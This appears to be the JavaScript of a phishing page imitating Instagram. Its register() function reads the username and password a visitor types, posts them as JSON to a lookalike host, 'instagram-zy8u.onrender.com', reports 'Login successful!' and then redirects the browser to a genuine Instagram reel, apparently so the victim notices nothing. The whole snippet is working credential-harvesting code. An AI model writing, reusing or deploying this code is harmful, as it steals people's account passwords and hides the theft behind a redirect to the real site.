function register() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    fetch('https://instagram-zy8u.onrender.com/register', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ username, password })
    })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        console.log('Login successful!');
        window.location.href = 'https://www.instagram.com/reel/C4LwuBTL1J4/?igsh=NXIxZzM0MmNtNm5m'; 

        // Redirect to login page or show success message
      } else {
        console.log('Login failed. Please try again.');
      }
    })
    .catch(error => {
      console.error('Error:', error);
      alert('Error: ' + error.message);
    });
  }
